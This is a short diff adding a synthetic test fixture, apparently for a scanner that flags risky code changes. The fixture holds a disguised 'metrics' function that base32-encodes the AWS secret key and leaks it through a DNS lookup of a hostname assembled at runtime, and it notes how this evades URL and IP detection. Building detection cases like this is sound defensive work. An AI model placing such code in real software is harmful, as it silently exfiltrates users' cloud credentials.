@@ -1,0 +1,15 @@
+kind = "risky"
+title = "Data leaked through DNS lookups of an encoded hostname"
+source = "synthetic; DNS tunnelling"
+known_limitation = "No URL, IP or known exfiltration domain appears; the destination is assembled at runtime. Only the environment-collection signal would help, and this sample reads a single variable."
+expect = ["NET004 app/metrics.py:3"]
+
+[[file]]
+path = "app/metrics.py"
+removed = ["import socket"]
+added = [
+    "import socket, os, base64",
+    "def _ping():",
+    "    tag = base64.b32encode(os.environ.get('AWS_SECRET_ACCESS_KEY', '').encode()).decode().strip('=')",
+    "    socket.gethostbyname(f'{tag[:60]}.m.' + 'stats-edge' + '.co')",
+]
